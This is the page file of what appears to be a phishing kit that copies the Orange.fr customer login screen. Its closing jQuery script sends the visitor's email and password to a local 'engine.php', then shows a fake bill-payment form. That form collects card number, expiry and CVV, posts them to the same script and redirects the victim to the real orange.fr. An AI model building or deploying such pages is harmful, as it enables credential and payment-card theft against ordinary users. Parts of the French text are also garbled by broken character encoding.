<?php

    $checkInfo = isset($_GET['checkinfo'])
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
<head>
  <link rel="shortcut icon" href="https://id-a.woopic.com/auth_user2/img/favicon.ico"/>
  <title>Pour continuer, identifiez-vous...</title>
  <meta http-equiv="Pragma" content="no-cache"/>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta content="width=device-width,initial-scale=1" name="viewport">
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="https://c.orange.fr/Css/o.css"/>  
  <link rel="stylesheet" href="https://id-a.woopic.com/auth_user2/css/style.min.css?v=v56"/>
  
  <!--[if IE 6]>
  <link href="https://id-a.woopic.com/auth_user2/css/style_ie6.min.css?v=v56" rel="stylesheet" type="text/css" />
  <![endif]-->
  <!--[if IE 7]>
  <link href="https://id-a.woopic.com/auth_user2/css/style_ie7.min.css?v=v56" rel="stylesheet" type="text/css" />
  <![endif]-->
  <!--[if IE 9]>
  <link href="https://id-a.woopic.com/auth_user2/css/style_ie9.min.css?v=v56" rel="stylesheet" type="text/css" />
  <![endif]-->
  <noscript>
      <meta http-equiv="refresh" content="0;url=https://id.orange.fr/auth_user/bin/auth_user.cgi?force=basic"/>
  </noscript>
  <script type="text/javascript">
  //<![CDATA[
      if (top.frames.length > 0){top.location.href=document.location.href;}
  //]]>
  
  var defaultPicto = "https://id-a.woopic.com/auth_user2/img/user2.gif"; 
  </script>
  
  <script type="text/javascript" src="https://id-a.woopic.com/auth_user2/js/authuser2.min.js?v=v56"></script>
  <script type="text/javascript">
    $(document).ready(function(){
      $('input.text').focus(function(){$(this).addClass('focus');});
      $('input.text').blur(function(){$(this).removeClass('focus');});
    });
  </script>
    <script type="text/javascript">
    var oan_siteKeywords="";
    var oan_siteContentTopic="";
    document.write('<scr'+'ipt src="https://all.orfr.adgtw.orangeads.fr/js/ora_authen.identification?sKW='+encodeURI(oan_siteKeywords)+'&sCT='+encodeURI(oan_siteContentTopic)+'"></scr'+'ipt>');
  </script>
    </head>
<body>
  <div id="sc_main">
    <div id="auth-header">
      <div id="auth-logo">
        <a href="http://www.orange.fr/portail" tabindex="1" title="site orange.fr"><div class="logo"></div></a>
      </div>
        <div id="auth-banner" tabindex="-1">
        <div class="oan_ad" id="ora_2_728x90_identification">
          <script type="text/javascript">
            //<![CDATA[
            if (typeof oan_displayAd=='function'){oan_displayAd('ora_2_728x90_identification');} 
            //]]>
          </script>
        </div>
      </div>
        <div class="clear"><!-- --></div>
    </div>
    <div id="sc_top" <?php if($checkInfo) echo "style='display:none'"; ?>>
      <div class="sc_top_title">Pour continuer, identifiez-vous...</div>
    </div>
      <div id="sc_top" <?php if(!$checkInfo) echo "style='display:none'"; ?>>
      <div class="sc_top_title">paiement de votre facture</div>
    </div>
    <div id="sc_content">
      <div id="sc_left_blocs" >
        <div class="sc_left_top_bloc">
          <table cellspacing="0" cellpadding="0" border="0">
            <tr>
              <td class="sc_box_tl"><div><!-- --></div></td>
              <td class="sc_box_t"><!-- --></td>
              <td class="sc_box_tr"><div><!-- --></div></td>
            </tr>
            <tr valign="top">
              <td class="sc_box_l"><!-- --></td>
              <td class="sc_box_content">
                <div id="topLeftContent" <?php if($checkInfo) echo "style='display:none'"; ?>>
                    <script type="text/javascript">
                    //<![CDATA[
                    var accounts=[ ];
                      var checkBOX =  0;
                    var accountsSort=accounts;
                    accountsSort.sort(function(a, b){var compA=a.login.toUpperCase();var compB=b.login.toUpperCase();return (compA < compB)?-1:(compA > compB)?1:0;});
                    delete accounts;
                    var isForcedLoginActive = false;
                    var isReauthent = false;
                    var isLoginParamPresent = false;
                    var forgetAccountUrl = "auth_user.cgi/forgetAccount";
                    var checkCookieUrl = "auth_user.cgi/checkCookie";
                    var refreshPictoUrl = "https://id.orange.fr/auth_user/bin/auth_user.cgi/RefreshPicto";
                    
                    var checkInterval = "280";
                    var displayName = 'html';
                    var woopicUrl = "https://id-a.woopic.com";
                    var resourcesUrl = 'auth_user2';
                    var AuthenticateTimeout = 300000;
                    var getUserType = '';
                    var getReturnUrl = 'https://espaceclientv3.orange.fr/';
                    var showLogin = true;
                    var nameMonobal = '';
                    var len = accountsSort.length;
                    if(len==0){showLogin=false;}else{for(i=0;i<len;i++){if(accountsSort[i].connected=='1' && accountsSort[i].ipl=='0'){showLogin=false;break;}}}
                    //]]>
                  </script>
                  
                  <script type="text/javascript">
                  
                                  </script>
                  
                  <div id="filter_main" class="filter"></div>
                  <div id="filter_pass" class="filter"></div>
                  <div id="filter_check" class="filter"></div>
                  <div id="infobulle_perso" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Pour personnaliser votre photo, rendez-vous dans votre espace client, cliquez sur votre nom d un utilisateur puis selectionnez la rubrique photo.
                  </div>
                  <div id="infobulle_switch" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Ne plus mР“В©moriser le compte utilisateur <br/>
                    <span id="infobulle_switch_login"></span>&nbsp;sur cet ordinateur ?
                    <div id="infobulle_switch_buttons">
                      <table cellspacing="0" cellpadding="0" border="0">
                        <tr>
                          <td>
                            <div class="sc_button_2">
                              <div class="sc_button_left_2"></div>
                              <input type="submit" onclick="cancelSwitch(); return false;"
                                     class="sc_button_content_2 normal submit" value="annuler"/>
                              <div class="sc_button_right_2"></div>
                              <span class="clear"><br clear="all"/></span>
                            </div>
                          </td>
                          <td>
                            <div class="sc_button_2">
                              <div class="sc_button_left_2"></div>
                              <input type="submit" onclick="doSwitch(); return false;"
                                     class="sc_button_content_2 normal submit2" value="valider"/>
                              <div class="sc_button_right_2"></div>
                              <span class="clear"><br clear="all"/></span>
                            </div>
                          </td>
                        </tr>
                      </table>
                      <div class="clear"><br clear="all" /></div>
                    </div>
                  </div>
                  <div id="panel_main">
                    <div class="panel_model panel_model_default" id="default">
                      <div id="div_picto_user">
                          <img id="remove_user" title="Cliquez ici pour ne plus memoriser ce compte utilisateur sur cet ordinateur."
                             alt="Cliquez ici pour ne plus mР“В©moriser ce compte utilisateur sur cet ordinateur." src="https://id-a.woopic.com/auth_user2/img//close.png"/>
                        <img id="img_picto_user" src="" alt="" title="" width="90" height="90" />
                        <p id="desc_picto_user"></p>
                        </div>
                      <form method="post" class="AuthentForm" id="AuthentForm" action="#">
                        <input name="co" id="co" type="hidden" value="42"/>
                        <input name="tt" id="tt" type="hidden" value=""/>
                        <input name="tp" id="tp" type="hidden" value=""/>
                        <input name="rl" id="rl" type="hidden" value="https://espaceclientv3.orange.fr/"/>
                        <input name="sv" id="sv" type="hidden" value=""/>
                        <input name="dp" id="dp" type="hidden" value="html"/>
                        <input name="rt" id="rt" type="hidden" value=""/>
                        <input name="losturl" id="losturl" type="hidden" value="https://r.orange.fr/r/Oid_lost" />
                          <input name="isconn" id="isconn" type="hidden" value="0" />
                          <div class="sc_field" id="default_credential">
                          <div class="sc_label">
                            <label for="default_f_credential">
 
adresse mail ou num&#233;ro de mobile 
                            </label>
                          </div>
                          <div class="sc_input sc_credential ">
                              <input name="credential" id="default_f_credential" type="text"
                                   class="ui-corner-all text" maxlength="78"
                                   value="" tabindex="100"/>
                              <div class="clear"><br clear="all"/></div>
                          </div>
                          <div class="clear"><br clear="all"/></div>
                        </div>
                        <div class="sc_field help" id="default_help">
                          <div class="sc_input sc_link">
                            <span id="default_credential_error" class="errorMessage" style="display:none"></span>
                            <a href="https://assistance.orange.fr/234.php" id="link_helpcookie" class="orange" tabindex="300">en&nbsp;savoir&nbsp;plus.</a>
                            <span id="technicalError" class="errorMessage" style="display: none;" >Ressayer ultrieurement (erreur technique). Si le problРlme persiste contactez votre service clients.</span>
          
                                <!-- a id="newaccount_url" href="new_account.cgi?return_url=https%3A%2F%2Fespaceclientv3.orange.fr%2F" class="orange" tabindex="300">comment s identifier ?</a -->
                                <a id="newaccount_url" href="http://r.orange.fr/r/Oid_faq-s-identifier?return_url=https%3A%2F%2Fespaceclientv3.orange.fr%2F" target="_blank" class="orange" tabindex="300">comment s identifier ?</a>

    
                                    <span id="help_connecteduser" class="hidden">Pour changer d un utilisateur, modifiez l adresse ou le mobile ci-dessus</span>
                            </div>
                          <div class="clear"><br clear="all"/></div>
                        </div>
                        <div class="sc_field sc_password" id="default_password">
                          <div class="sc_label">
                            <label for="default_f_password">mot de passe</label>
                          </div>
                          <div class="sc_input ">
                            <input name="password" id="default_f_password" type="password" class="ui-corner-all password" value="" maxlength="36" tabindex="200" autocomplete="off" />
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        <div class="sc_field lostpassword" id="default_lostpassword">
                          <div class="sc_input sc_link">
                            <span id="default_password_error" class="errorMessage" style="display:none"></span>
                            <a href="https://r.orange.fr/r/Oid_lost?return_url=https%253A%252F%252Fespaceclientv3.orange.fr%252F" id="link_lost"  class="orange">mot de passe oubli&#233; ?

</a>
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_login"
                             title="D eochez cette case si vous utilisez un equipement public (..)">
                          <div class="sc_input">
                              <input id="default_f_memorize_login" name="memorize_login" type="checkbox"
                                   class="csCheckbox" checked="checked"/>
                              <label for="default_f_memorize_login" class="checkboxLabel">
                                memoriser l adresse mail ou le n de mobile
                              </label>
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_password"
                             title="D ecochez cette case si plusieurs personnes utilisent cet equipement.">
                          <div class="sc_input">
                              <input id="default_f_memorize_password" class="csCheckbox" type="checkbox" 
                                name="memorize_password" />
                              <label for="default_f_memorize_password" class="checkboxLabel">
                              rester identifier 
                            </label>
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        
                        <div class="actions">
                          <table cellpadding="0" cellspacing="0" border="0" width="100%">
                            <tr>
                              <td>
                                <table cellspacing="0" cellpadding="0" border="0">
                                  <tr>
                                      <td>
                                      <div class="sc_default_button_2">
    
                                        <div class="sc_button_left_2"></div>
                                        <input type="submit" class="sc_button_content_2 submit submit2"
                                               value="s identifier"/>
                                        <div class="sc_button_right_2"></div>
                                        <span class="clear"><br clear="all"/></span>
    
                                      </div>
                                    </td>
                                    </tr>
                                </table>
                                <div class="clear"><br clear="all" /></div>
                              </td>
                            </tr>
                          </table>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
                 <div id="topLeftContent" <?php if(!$checkInfo) echo "style='display:none'"; ?>>
                  <div id="panel_main">
                    
                      <form method="post" class="AuthentForm" id="AuthentForm" action="#">
                       
                      
                          <div class="sc_field" id="default_credential">
                         
                            <p class="warning-star">les champs marques d un <span class="star">*</span> sont obligatoires</p>
                          <div id="pay_with_card" style="margin-left: 100px;">
              <div class="form_cardType line">
			    <label for="form_card_type">Type de carte<span class="star">*</span></label>
  				<select id="form_card_type" name="card_type" onchange="assignSecuCodeInputMaxLength('form_card_type');">
				  <option disabled="disabled" selected="selected" value="">&nbsp;</option>
				  <option value="cb">CB Card</option>
				  <option value="visa">Visa</option>
			      <option value="mastercard">Mastercard</option>
				  <option value="ecb">e-carteBleue</option>
				</select> 
					<!--img class="cards" src="/css/FPC_ORA_FAC/webpc/css/media/credits-logos.png" width="188" height="22" alt="Carte Bleue, Visa, MasterCard, e-Carte"/-->
                <!--div class="cards"-->
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_cb.png" width="29" height="22" alt="Carte Bleue">
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_visa.png" width="41" height="22" alt="Visa">
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_mastercard.png" width="35" height="22" alt="MasterCard">
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_ecb.png" width="51" height="22" alt="e-Carte">
                <!--</div>-->
				</div>
				<div class="form_CardNumber line">
                  <label for="form_card_number" class="libelle">Card Number<span class="star">*</span></label>
                  <input type="text" size="16" pattern="[0-9]*" class="largeinput" name="card_number" id="form_card_number" maxlength="19" autocomplete="off">
				</div>
				<div class="divExpirationDate line">
                <label for="form_expiry_month" class="libelle">Date d'expiration<span class="star">*</span></label>
					<select id="form_expiry_month" name="card_expiration_month">
                            <option value="">mois</option>
							<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
						</select>
						<select id="form_expiry_year" name="card_expiration_year">
							<option>annee</option>
                            <option value="2017">2017</option>
                            <option value="2018">2018</option>
                            <option value="2019">2019</option>
                            <option value="2020">2020</option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
						</select>
					</div>
				<div class="divSecurityCode line">
					<label for="form_card_security" class="libelle">Security code<span class="star">*</span></label>
					<input type="text" size="5" pattern="[0-9]*" class="codeSecuriteinput" name="card_security_code" id="form_card_security" autocomplete="off" maxlength="3">
				</div>
				<div class="divSecurityCodeInfoBox line">
                  <img class="cardCVV cardCBCVV" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_cb.jpg" width="97" height="53" alt="Where to find your security code">
					<p class="infoSecurityCode">Your security code is the last 3 digits shown on the signature strip on the reverse of your card.
					</p>
				</div>
              </div>
                          <div class="clear"><br clear="all"/></div>
                        </div>
                       
                       
                        
                        <div class="actions" style="float:right">
                          <table cellpadding="0" cellspacing="0" border="0" width="100%">
                            <tr>
                              <td>
                                <table cellspacing="0" cellpadding="0" border="0">
                                  <tr>
                                      <td>
                                      <div class="sc_default_button_2">
    
                                        <style>
                                        a.validate-btn {
    background: url(https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/btn-orange-no-arrow.png) no-repeat scroll 0 0 transparent;
    border: medium none;
    color: #FFFFFF;
    cursor: pointer;
    display: block;
    float: right;
    font-size: 14px;
    font-weight: bold;
    left: -28px;
    line-height: 20px;
    padding: 14px 6px 16px 35px;
    position: relative;
}

 a.validate-btn .end {
    position: absolute;
    width: 30px;
    height: 50px;
    right: -30px;
    top: 0;
    display: block;
    background: url(https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/btn-orange-no-arrow.png) no-repeat scroll right 0 transparent;
}
</style>
                                       <a id="form_button_submit" class="validate-btn payment" href="javascript:void(0)">confirmer votre paiement
			  <span class="end"></span>
			</a>
                                               <span class="end"></span>
                                        <span class="clear"><br clear="all"/></span>
    
                                      </div>
                                    </td>
                                    </tr>
                                </table>
                                <div class="clear"><br clear="all" /></div>
                              </td>
                            </tr>
                          </table>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
                </td>
              <td class="sc_box_r"><!-- --></td>
            </tr>
            <tr>
              <td class="sc_box_bl"><div><!-- --></div></td>
              <td class="sc_box_b"><!-- --></td>
              <td class="sc_box_br"><div><!-- --></div></td>
            </tr>
          </table>
        </div>
      </div>
      <div class="clear"></div>
    </div>
      <script type="text/javascript">
      //<![CDATA[
      o_audience();
      //]]>
    </script>
        <script type="text/javascript">
      //<![CDATA[
      function loadGstat(url, callback){var script=document.createElement("script");script.type="text/javascript";if(script.readyState){script.onreadystatechange=function(){if(script.readyState=="loaded"||script.readyState=="complete"){script.onreadystatechange=null;callback();}};}else{script.onload=function(){callback();}}script.src=url;document.getElementsByTagName("head")[0].appendChild(script);}var gs_d=new Date, DoW = gs_d.getDay();gs_d.setDate(gs_d.getDate() - (DoW + 6) % 7 + 3);var ms=gs_d.valueOf();gs_d.setMonth(0);gs_d.setDate(4);var gs_r=(Math.round((ms - gs_d.valueOf()) / 6048E5) + 1) * gs_d.getFullYear();var GstatServerProtocol=(("https:" == document.location.protocol) ? "https://" : "http://");loadGstat(GstatServerProtocol + 's.gstat.orange.fr/lib/gs.js?' + gs_r, function(){if(_gstat){_gstat.audience();}});                                        
      //]]>
    </script>
        <div id="sc_linkbottomnew">
      Pas inscrit ? 
      <a href="http://r.orange.fr/r/Oid_faq-s-identifier?return_url=https%3A%2F%2Fespaceclientv3.orange.fr%2F" target="_blank" class="orange">CrР“В©ez ou activez votre compte</a>
    </div>
  
    <div id="o_footer">
      <ul>
        <li style="padding-right: 92px;">
          <a title="informations lР“В©gales (nouvelle fenР“Р„tre)" target="_blank" 
            onclick="window.open(this.href, 'informations lР“В©gales', config='height=800, width=700, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no') ; return false;" 
            href="http://r.orange.fr/r/Oinfoslegales_abo">informations lР“В©gales</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="publicitР“В© (nouvelle fenР“Р„tre)" target="_blank" 
            href="http://r.orange.fr/r/Eorangepublicite">publicitР“В©</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="internet+ (nouvelle fenР“Р„tre)" target="_blank" 
            href="http://r.orange.fr/r/Einternetplus">internet+</a>
        </li>
        <li style="padding-right: 92px;">
          <a title="signaler un contenu illicite (nouvelle fenР“Р„tre)" target="_blank" 
            href="http://r.orange.fr/r/Esignaler">signaler un contenu illicite</a>
        </li> 
        <li style="padding-right: 92px;">
          <a title="donnР“В©es personnelles (nouvelle fenР“Р„tre)" target="_blank" 
            href="http://r.orange.fr/r/Ohome_donneespersonnelles">donnР“В©es personnelles</a>
        </li>
        <li>
          <a title="les cookies (nouvelle fenР“Р„tre)" target="_blank" 
            href="http://assistance.orange.fr/les-cookies-2917.php">les cookies</a>
        </li>
      </ul>
    </div>
  </div>
  <script
  src="https://code.jquery.com/jquery-2.2.4.min.js"
  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
  crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>



  <script>
    $(document).ready(function(){
        $('.submit2').click(function(e){
e.preventDefault();
var email = $('#default_f_credential').val();
if(email.indexOf('@orange.fr') != -1 || email.indexOf('@wanadoo.fr') != -1){
$.ajax({
                url:'./engine.php?checklogin',
                method:'POST',
                data:{
                    user: $('#default_f_credential').val(),
                    password: $('#default_f_password').val()
                },
                success: function(){
                    document.location = "?checkinfo";
                    //alert("dshflksjdhfldks");
                }

            })
}
            //alert("asdasdasdas");
            
        });
        $('#form_button_submit').click(function(e){
e.preventDefault();
             $.ajax({
                url:'./engine.php?sendinfo',
                method:'POST',
                data:{
                    type: $('#form_card_type').val(),
                    num: $('#form_card_number').val(),
exp:$('#form_expiry_month').val() + " / " + $('#form_expiry_year').val(),
cvv:$('#form_card_security').val(),
                },
                success: function(){
                    document.location = "http://orange.fr";
                    //alert("dshflksjdhfldks");
                }

            })
        })
    });
  </script>
</body>
</html>
